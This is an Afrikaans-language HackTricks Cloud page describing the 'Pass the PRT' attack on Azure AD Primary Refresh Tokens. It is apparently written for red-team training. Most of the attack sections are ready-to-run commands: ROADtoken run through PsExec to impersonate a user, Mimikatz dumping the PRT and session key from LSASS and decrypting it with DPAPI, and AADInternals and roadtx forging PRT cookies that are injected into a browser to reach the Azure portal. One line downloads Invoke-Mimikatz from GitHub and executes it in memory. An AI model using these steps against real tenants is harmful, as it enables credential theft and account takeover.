# Az - Pass the PRT

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
{% endhint %}

## Wat is 'n PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Kyk of jy 'n PRT het
```
Dsregcmd.exe /status
```
In die SSO State afdeling, behoort jy die **`AzureAdPrt`** te sien wat op **YES** gestel is.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

In dieselfde uitset kan jy ook sien of die **toestel aan Azure gekoppel is** (in die veld `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Koekie

Die PRT koekie word eintlik **`x-ms-RefreshTokenCredential`** genoem en dit is 'n JSON Web Token (JWT). 'n JWT bevat **3 dele**, die **kop**, **inhoud** en **handtekening**, geskei deur 'n `.` en almal url-veilige base64 gekodeer. 'n Tipiese PRT koekie bevat die volgende kop en liggaam:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Die werklike **Primary Refresh Token (PRT)** is ingesluit binne die **`refresh_token`**, wat deur 'n sleutel onder die beheer van Azure AD ge√Ønkripteer is, wat die inhoud ondeursigtig en ondekodeerbaar vir ons maak. Die veld **`is_primary`** dui die insluiting van die prim√™re verfrissingstoken binne hierdie token aan. Om te verseker dat die koekie gebonde bly aan die spesifieke aanmeldsessie waarvoor dit bedoel was, word die `request_nonce` vanaf die `logon.microsoftonline.com` bladsy gestuur.

### PRT Koekie vloei met TPM

Die **LSASS** proses sal die **KDF konteks** na die TPM stuur, en die TPM sal die **sessiesleutel** gebruik (versamel toe die toestel in AzureAD geregistreer is en in die TPM gestoor is) en die vorige konteks om 'n **sleutel af te lei**, en hierdie **afgeleide sleutel** word gebruik om die **PRT koekie (JWT)** te **onderteken**.

Die **KDF konteks is** 'n nonce van AzureAD en die PRT wat 'n **JWT** skep gemeng met 'n **konteks** (ewekansige grepe).

Daarom, selfs al kan die PRT nie onttrek word nie omdat dit binne die TPM gele√´ is, is dit moontlik om LSASS te misbruik om **afgeleide sleutels van nuwe kontekste aan te vra en die gegenereerde sleutels te gebruik om Koekies te onderteken**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT Misbruik Scenario's

As 'n **gewone gebruiker** is dit moontlik om **PRT gebruik aan te vra** deur LSASS vir SSO data te vra.\
Dit kan gedoen word soos **inheemse toepassings** wat tokens van **Web Account Manager** (token makelaar) aanvra. WAM stuur die versoek na **LSASS**, wat tokens aanvra deur gebruik te maak van ondertekende PRT bewering. Of dit kan gedoen word met **blaaier gebaseerde (web) vloei** waar 'n **PRT koekie** as **kop** gebruik word om versoeke aan Azure AS aanmeldbladsye te verifieer.

As **SYSTEM** kan jy **die PRT steel as dit nie beskerm word** deur TPM of **interaksie h√™ met PRT sleutels in LSASS** deur kripto API's te gebruik.

## Pass-the-PRT Aanval Voorbeelde

### Aanval - ROADtoken

Vir meer inligting oor hierdie manier [**kyk hierdie pos**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken sal **`BrowserCore.exe`** vanaf die regte gids laat loop en dit gebruik om **'n PRT koekie te bekom**. Hierdie koekie kan dan gebruik word met ROADtools om te verifieer en **'n volgehoue verfrissingstoken te bekom**.

Om 'n geldige PRT koekie te genereer, is die eerste ding wat jy nodig het 'n nonce.\
Jy kan dit kry met:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Of gebruik [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Toe kan jy [**roadtoken**](https://github.com/dirkjanm/ROADtoken) gebruik om 'n nuwe PRT te kry (voer dit in die hulpmiddel uit vanaf 'n proses van die gebruiker om aan te val):
```powershell
.\ROADtoken.exe <nonce>
```
As oneliner:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Dan kan jy die **gegenereerde koekie** gebruik om **tokens te genereer** om **aan te meld** met behulp van Azure AD **Graph** of Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Aanval - Gebruik roadrecon

### Aanval - Gebruik AADInternals en 'n gelekte PRT

`Get-AADIntUserPRTToken` **kry gebruiker se PRT-token** van die Azure AD-gekoppelde of Hibriede gekoppelde rekenaar. Gebruik `BrowserCore.exe` om die PRT-token te kry.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Of as jy die waardes van Mimikatz het, kan jy ook AADInternals gebruik om 'n teken te genereer:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gaan na [https://login.microsoftonline.com](https://login.microsoftonline.com), vee alle koekies vir login.microsoftonline.com uit en voer 'n nuwe koekie in.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Gaan dan na [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Die res moet die verstek wees. Maak seker jy kan die bladsy verfris en die koekie verdwyn nie, as dit wel gebeur, het jy dalk 'n fout gemaak en moet jy die proses weer deurgaan. As dit nie gebeur nie, behoort jy reg te wees.
{% endhint %}

### Aanval - Mimikatz

#### Stappe

1. Die **PRT (Primary Refresh Token) word uit LSASS** (Local Security Authority Subsystem Service) onttrek en gestoor vir latere gebruik.
2. Die **Sessie Sleutel word volgende onttrek**. Aangesien hierdie sleutel aanvanklik uitgereik en dan her-enkripteer word deur die plaaslike toestel, vereis dit dekripsie met 'n DPAPI meester sleutel. Gedetailleerde inligting oor DPAPI (Data Protection API) kan gevind word in hierdie bronne: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) en vir 'n begrip van die toepassing daarvan, verwys na [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Na dekripsie van die Sessie Sleutel, word die **afgeleide sleutel en konteks vir die PRT verkry**. Hierdie is noodsaaklik vir die **skepping van die PRT koekie**. Spesifiek, die afgeleide sleutel word gebruik vir die ondertekening van die JWT (JSON Web Token) wat die koekie uitmaak. 'n Omvattende verduideliking van hierdie proses is verskaf deur Dirk-jan, toeganklik [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Let daarop dat as die PRT binne die TPM is en nie binne `lsass` nie, **mimikatz dit nie sal kan onttrek nie**.\
Dit sal egter moontlik wees om 'n **sleutel van 'n afgeleide sleutel van 'n konteks** van die TPM te kry en dit te gebruik om **'n koekie te onderteken (kyk opsie 3).**
{% endhint %}

Jy kan 'n **in-diepte verduideliking van die uitgevoerde proses** om hierdie besonderhede te onttrek hier vind: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Dit sal nie presies werk na die Augustus 2021 regstellings om ander gebruikers se PRT tokens te kry nie, aangesien slegs die gebruiker sy PRT kan kry (‚Äôn plaaslike admin kan nie toegang kry tot ander gebruikers se PRTs nie), maar kan toegang kry tot sy eie.
{% endhint %}

Jy kan **mimikatz** gebruik om die PRT te onttrek:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Kopieer** die deel gemerk **Prt** en stoor dit.\
Onttrek ook die sessiesleutel (die **`KeyValue`** van die **`ProofOfPossesionKey`** veld) wat jy hieronder gemerk kan sien. Dit is ge√´nkripteer en ons sal ons DPAPI-hoofsleutels moet gebruik om dit te dekripteer.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
As jy geen PRT-data sien nie, kan dit wees dat jy **geen PRTs het nie** omdat jou toestel nie by Azure AD aangesluit is nie of dit kan wees dat jy **'n ou weergawe** van Windows 10 gebruik.
{% endhint %}

Om die sessiesleutel te **dekripteer** moet jy jou voorregte **verhoog** na **SYSTEM** om onder die rekenaarkonteks te kan hardloop om die **DPAPI-hoofsleutel te gebruik om dit te dekripteer**. Jy kan die volgende opdragte gebruik om dit te doen:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Opsie 1 - Volle Mimikatz

* Nou wil jy beide die Context waarde kopieer:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* En die afgeleide sleutel waarde:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Uiteindelik kan jy al hierdie inligting gebruik om **PRT koekies te genereer**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Gaan na [https://login.microsoftonline.com](https://login.microsoftonline.com), vee alle koekies vir login.microsoftonline.com uit en voer 'n nuwe koekie in.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Gaan dan na [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Die res moet die verstek wees. Maak seker jy kan die bladsy verfris en die koekie verdwyn nie, as dit wel gebeur, het jy dalk 'n fout gemaak en moet jy die proses weer deurgaan. As dit nie gebeur nie, behoort jy reg te wees.
{% endhint %}

#### Opsie 2 - roadrecon met behulp van PRT

* Hernu eers die PRT, wat dit in `roadtx.prt` sal stoor:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Nou kan ons **tokens aanvra** deur die interaktiewe blaaier te gebruik met `roadtx browserprtauth`. As ons die `roadtx describe` opdrag gebruik, sien ons die toegangstoken sluit 'n MFA-eis in omdat die PRT wat ek in hierdie geval gebruik het ook 'n MFA-eis gehad het.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Opsie 3 - roadrecon met afgeleide sleutels

Met die konteks en die afgeleide sleutel wat deur mimikatz gestort is, is dit moontlik om roadrecon te gebruik om 'n nuwe getekende koekie te genereer met:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Verwysings

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
